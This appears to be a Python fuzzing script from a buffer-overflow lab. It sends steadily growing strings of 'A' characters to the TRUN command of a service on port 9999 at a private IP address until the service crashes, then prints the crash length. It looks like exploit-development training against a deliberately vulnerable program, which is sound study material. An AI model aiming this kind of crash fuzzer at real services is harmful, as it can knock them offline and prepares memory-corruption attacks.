#!/usr/bin/env python3
import sys
import socket
from time import sleep

ip = "192.168.128.136"
port = 9999
target = (ip, port)
prefix = "TRUN /.:/"
payload = prefix + "A" * 100
timeout = 5

while True:
    try:
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect(target)
            s.recv(1024)
            print(f"[+] Fuzzing with {str(len(payload) - len(prefix))} bytes")
            s.send(payload.encode())
            s.recv(1024)          
        
    except:
        print(f"Fuzzing crashed at {str(len(payload) - len(prefix))} bytes")
        sys.exit(0)

    payload += "A" * 100
    sleep(1)
        
